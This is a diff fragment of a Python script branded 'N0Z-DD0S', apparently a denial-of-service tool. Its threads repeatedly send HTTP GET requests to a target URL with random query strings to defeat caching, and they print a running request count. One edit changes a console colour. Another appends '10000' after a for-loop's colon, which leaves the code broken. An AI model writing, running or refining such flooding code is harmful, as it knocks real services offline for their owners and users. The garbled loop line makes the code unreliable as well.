@@ -75,7 +75,7 @@ def useragent():
 def genstr(size):
     out_str = ''
 
-    for _ in range(0, size):
+    for _ in range(0, size):10000
         code = random.randint(65, 90)
         out_str += chr(code)
     
@@ -91,7 +91,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("{0}\033[96mN0Z-DD0S  [\033[4mREQUEST SEND TO  [\033[33m" +url+ " \033[0m".format(count))
+                print ("{0}\033[93mN0Z-DD0S  [\033[4mREQUEST SEND TO  [\033[33m" +url+ " \033[0m".format(count))
             except requests.exceptions.ConnectionError:
                 
                 
